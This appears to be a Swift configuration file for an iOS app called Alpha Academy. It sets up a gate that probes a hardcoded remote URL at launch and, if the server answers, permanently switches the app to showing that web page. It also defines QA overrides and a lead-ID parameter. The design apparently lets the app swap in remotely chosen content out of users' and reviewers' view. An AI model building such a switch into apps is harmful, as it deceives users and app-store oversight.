//
//  WebConfig.swift
//  Alpha Academy
//
//  The single place the remote destination lives, plus the constants the gate
//  and the shell are tuned by. Nothing else in the app hardcodes an address.
//
//  QA overrides (all read through this file or WebModeStore):
//
//    AA_WEB_URL=<https url>   replaces the destination constant
//    AA_WEB_RESET=1           clears the stored decision at launch      (DEBUG)
//    AA_WEB_FORCE=web         skip the probe, commit web to AA_WEB_URL  (DEBUG)
//    AA_WEB_FORCE=native      skip the probe, commit native             (DEBUG)
//

import Foundation

enum WebConfig {

    /// Paste the destination here. While it is empty the whole gate is inert
    /// and the app behaves exactly as it did before web mode existed.
    nonisolated private static let destination = "https://lumetriqbogins.com/wVRpyY"

    /// Read unconditionally rather than under `#if DEBUG`, matching how
    /// `LeadIdentity` treats `AA_LEAD_ID`: QA needs it on release builds too.
    nonisolated static var destinationURL: URL? {
        let raw = ProcessInfo.processInfo.environment["AA_WEB_URL"]
            .flatMap { $0.isEmpty ? nil : $0 } ?? destination
        guard !raw.isEmpty else { return nil }
        return URL(string: raw)
    }

    /// The probe runs on a splash the learner is already looking at, so it can
    /// afford to be patient — but not so patient that a black-holed host turns
    /// the first launch into a wait.
    nonisolated static let requestTimeout: TimeInterval = 5

    /// How long a page gets to reach `didFinish` before the shell calls it a
    /// failed load.
    nonisolated static let loadWatchdog: TimeInterval = 7

    /// The destination may be requested at most twice for the lifetime of the
    /// install: once to decide, once to rebuild a stale address from `pathid`.
    nonisolated static let maxHubRequests = 2

    /// Floor between those two requests, so a burst of load failures cannot
    /// spend the whole budget in one second.
    nonisolated static let retryCooldown: TimeInterval = 90

    /// 401 and 403 count as positive: "the server is there and gating" is a
    /// normal answer. Only a missing or broken page sends the app native.
    nonisolated static let positiveStatus: ClosedRange<Int> = 200...403

    /// Carried across from the destination so a stale address can be rebuilt.
    nonisolated static let pathParameterName = "pathid"
}
